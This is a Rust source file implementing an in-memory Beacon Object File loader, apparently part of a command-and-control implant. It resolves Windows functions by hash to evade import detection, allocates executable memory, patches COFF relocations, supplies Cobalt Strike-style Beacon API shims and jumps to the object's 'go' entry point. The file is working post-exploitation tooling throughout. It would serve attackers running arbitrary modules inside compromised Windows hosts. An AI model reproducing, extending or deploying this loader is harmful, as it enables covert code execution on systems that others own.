use alloc::vec::Vec;
use core::ffi::c_void;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;

// Constants - Windows Specific
#[cfg(target_os = "windows")]
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_ADDR64: u16 = 0x0001;
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_ADDR32NB: u16 = 0x0003;
#[cfg(target_os = "windows")]
const IMAGE_REL_AMD64_REL32: u16 = 0x0004;

#[cfg(target_os = "windows")]
#[repr(C, packed)]
struct CoffHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[cfg(target_os = "windows")]
#[repr(C, packed)]
struct SectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_line_numbers: u32,
    number_of_relocations: u16,
    number_of_line_numbers: u16,
    characteristics: u32,
}

#[cfg(target_os = "windows")]
#[repr(C, packed)]
struct Relocation {
    virtual_address: u32,
    symbol_table_index: u32,
    type_: u16,
}

#[cfg(target_os = "windows")]
#[repr(C, packed)]
struct Symbol {
    name: [u8; 8],
    value: u32,
    section_number: i16,
    type_: u16,
    storage_class: u8,
    number_of_aux_symbols: u8,
}

pub struct BofLoader {
    raw_data: Vec<u8>,
}

// Global buffer for BOF output (Single-threaded context)
static mut BOF_OUTPUT: Vec<u8> = Vec::new();

// Beacon Internal Functions (BIFs) Implementation
#[repr(C)]
pub struct datap {
    buffer: *const u8,
    length: u32,
    size: u32,
    offset: u32,
}

#[no_mangle]
pub unsafe extern "C" fn BeaconPrintf(_type: i32, fmt: *const u8, _args: *const c_void) {
    // Capture output
    if !fmt.is_null() {
        let mut len = 0;
        while *fmt.add(len) != 0 {
            len += 1;
        }
        let slice = core::slice::from_raw_parts(fmt, len);
        (*core::ptr::addr_of_mut!(BOF_OUTPUT)).extend_from_slice(slice);
        (*core::ptr::addr_of_mut!(BOF_OUTPUT)).push(b'\n'); // Newline for readability
    }
}

#[no_mangle]
pub unsafe extern "C" fn BeaconDataParse(parser: *mut datap, data: *const u8, size: u32) {
    if parser.is_null() || data.is_null() { return; }
    (*parser).buffer = data;
    (*parser).length = size;
    (*parser).size = size;
    (*parser).offset = 0;
}

#[no_mangle]
pub unsafe extern "C" fn BeaconDataInt(parser: *mut datap) -> i32 {
    if parser.is_null() || (*parser).offset + 4 > (*parser).length { return 0; }
    let ptr = (*parser).buffer.add((*parser).offset as usize);
    let val = i32::from_be_bytes(*(ptr as *const [u8; 4]));
    (*parser).offset += 4;
    val
}

#[no_mangle]
pub unsafe extern "C" fn BeaconDataShort(parser: *mut datap) -> i16 {
    if parser.is_null() || (*parser).offset + 2 > (*parser).length { return 0; }
    let ptr = (*parser).buffer.add((*parser).offset as usize);
    let val = i16::from_be_bytes(*(ptr as *const [u8; 2]));
    (*parser).offset += 2;
    val
}

#[no_mangle]
pub unsafe extern "C" fn BeaconDataLength(parser: *mut datap) -> i32 {
    if parser.is_null() { return 0; }
    ((*parser).length - (*parser).offset) as i32
}

#[no_mangle]
pub unsafe extern "C" fn BeaconDataExtract(parser: *mut datap, size: *mut i32) -> *mut u8 {
    if parser.is_null() || (*parser).offset + 4 > (*parser).length { return core::ptr::null_mut(); }
    
    // Read length of following data (CS format uses 4-byte big-endian length)
    let len_ptr = (*parser).buffer.add((*parser).offset as usize);
    let data_len = u32::from_be_bytes(*(len_ptr as *const [u8; 4]));
    (*parser).offset += 4;

    if (*parser).offset + data_len > (*parser).length { return core::ptr::null_mut(); }
    
    let data_ptr = (*parser).buffer.add((*parser).offset as usize) as *mut u8;
    if !size.is_null() {
        *size = data_len as i32;
    }
    (*parser).offset += data_len;
    data_ptr
}

impl BofLoader {
    pub fn new(data: Vec<u8>) -> Self {
        Self { raw_data: data }
    }

    pub fn get_output(&self) -> Vec<u8> {
        unsafe { (*core::ptr::addr_of!(BOF_OUTPUT)).clone() }
    }

    pub fn clear_output(&self) {
        unsafe { (*core::ptr::addr_of_mut!(BOF_OUTPUT)).clear() }
    }

    #[cfg(target_os = "windows")]
    pub fn load_and_run(&self) -> Result<(), ()> {
        self.clear_output();
        unsafe {
            let base = self.raw_data.as_ptr();
            if self.raw_data.len() < core::mem::size_of::<CoffHeader>() {
                return Err(());
            }
            
            let header = &*(base as *const CoffHeader);
            if header.machine != IMAGE_FILE_MACHINE_AMD64 {
                return Err(());
            }

            // 1. Resolve Sections
            let section_table_offset = core::mem::size_of::<CoffHeader>() + header.size_of_optional_header as usize;
            let mut section_mappings = Vec::new();
            
            let kernel32 = hash_str(b"kernel32.dll");
            let virtual_alloc = resolve_function(kernel32, hash_str(b"VirtualAlloc"));
            if virtual_alloc.is_null() { return Err(()); }
            
            type FnVirtualAlloc = unsafe extern "system" fn(PVOID, usize, u32, u32) -> PVOID;
            let bof_mem = core::mem::transmute::<_, FnVirtualAlloc>(virtual_alloc)(
                core::ptr::null_mut(),
                self.raw_data.len() * 4, // Enough space
                0x3000,
                0x40
            );
            if bof_mem.is_null() { return Err(()); }

            // Copy sections
            for i in 0..header.number_of_sections {
                let offset = section_table_offset + (i as usize * core::mem::size_of::<SectionHeader>());
                let section = &*(base.add(offset) as *const SectionHeader);
                
                let dest = (bof_mem as usize + (i as usize * 4096)) as *mut u8;
                if section.pointer_to_raw_data != 0 {
                    core::ptr::copy_nonoverlapping(
                        base.add(section.pointer_to_raw_data as usize),
                        dest,
                        section.size_of_raw_data as usize
                    );
                }
                section_mappings.push(dest);
            }

            // 2. Relocations & Symbol Resolution
            let sym_table = base.add(header.pointer_to_symbol_table as usize) as *const Symbol;
            let string_table = sym_table.add(header.number_of_symbols as usize) as *const u8;

            for i in 0..header.number_of_sections {
                let offset = section_table_offset + (i as usize * core::mem::size_of::<SectionHeader>());
                let section = &*(base.add(offset) as *const SectionHeader);
                
                let relocs = base.add(section.pointer_to_relocations as usize) as *const Relocation;
                let section_base = section_mappings[i as usize] as usize;

                for j in 0..section.number_of_relocations {
                    let reloc = &*relocs.add(j as usize);
                    let symbol = &*sym_table.add(reloc.symbol_table_index as usize);
                    
                    let mut sym_addr: usize = 0;
                    
                    if symbol.section_number > 0 {
                        // Internal symbol
                        let target_section_base = section_mappings[(symbol.section_number - 1) as usize] as usize;
                        sym_addr = target_section_base + symbol.value as usize;
                    } else {
                        // External Symbol
                        let name_ptr = if symbol.name[0] == 0 {
                            // Long name in string table
                            let offset = u32::from_le_bytes(symbol.name[4..8].try_into().unwrap());
                            string_table.add(offset as usize)
                        } else {
                            symbol.name.as_ptr()
                        };

                        // Calculate name length
                        let mut name_len = 0;
                        while *name_ptr.add(name_len) != 0 && name_len < 64 { // Cap check
                            name_len += 1;
                        }
                        let name_slice = core::slice::from_raw_parts(name_ptr, name_len);
                        let name_str = core::str::from_utf8(name_slice).unwrap_or("");

                        if name_str.starts_with("__imp_") {
                            // __imp_KERNEL32$WriteFile
                            let parts: Vec<&str> = name_str[6..].split('$').collect();
                            if parts.len() == 2 {
                                let mod_hash = hash_str(parts[0].as_bytes());
                                let func_hash = hash_str(parts[1].as_bytes());
                                let func_addr = resolve_function(mod_hash, func_hash);
                                if !func_addr.is_null() {
                                    sym_addr = func_addr as usize;
                                }
                            }
                        } else if name_str == "BeaconPrintf" {
                            sym_addr = BeaconPrintf as usize;
                        } else if name_str == "BeaconDataParse" {
                            sym_addr = BeaconDataParse as usize;
                        } else if name_str == "BeaconDataInt" {
                            sym_addr = BeaconDataInt as usize;
                        } else if name_str == "BeaconDataShort" {
                            sym_addr = BeaconDataShort as usize;
                        } else if name_str == "BeaconDataLength" {
                            sym_addr = BeaconDataLength as usize;
                        } else if name_str == "BeaconDataExtract" {
                            sym_addr = BeaconDataExtract as usize;
                        }
                    }

                    if sym_addr != 0 {
                        let patch_addr = section_base + reloc.virtual_address as usize;
                        match reloc.type_ {
                            IMAGE_REL_AMD64_ADDR64 => {
                                core::ptr::write_unaligned(patch_addr as *mut usize, sym_addr);
                            }
                            IMAGE_REL_AMD64_REL32 => {
                                let diff = (sym_addr as isize) - (patch_addr as isize + 4);
                                core::ptr::write_unaligned(patch_addr as *mut i32, diff as i32);
                            }
                            IMAGE_REL_AMD64_ADDR32NB => {
                                let offset = (sym_addr as isize) - (bof_mem as isize);
                                core::ptr::write_unaligned(patch_addr as *mut i32, offset as i32);
                            }
                            _ => {}
                        }
                    }
                }
            }

            // 3. Execution
            for i in 0..header.number_of_symbols {
                let symbol = &*sym_table.add(i as usize);
                let name = if symbol.name[0] == 0 {
                    let offset = u32::from_le_bytes(symbol.name[4..8].try_into().unwrap());
                    let p = string_table.add(offset as usize);
                    let mut l = 0;
                    while *p.add(l) != 0 { l+=1; }
                    core::str::from_utf8(core::slice::from_raw_parts(p, l)).unwrap_or("")
                } else {
                    core::str::from_utf8(&symbol.name).unwrap_or("").trim_matches(char::from(0))
                };

                if name == "go" {
                    let entry_section = section_mappings[(symbol.section_number - 1) as usize];
                    let entry_point = (entry_section as usize + symbol.value as usize) as *const ();
                    type FnGo = unsafe extern "C" fn(*const u8, u32);
                    core::mem::transmute::<_, FnGo>(entry_point)(core::ptr::null(), 0);
                    break;
                }
            }
        }
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    pub fn load_and_run(&self) -> Result<(), ()> {
        if self.raw_data.is_empty() { return Err(()); }
        Err(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bof_loader_init() {
        let _loader = BofLoader::new(Vec::new());
    }
}
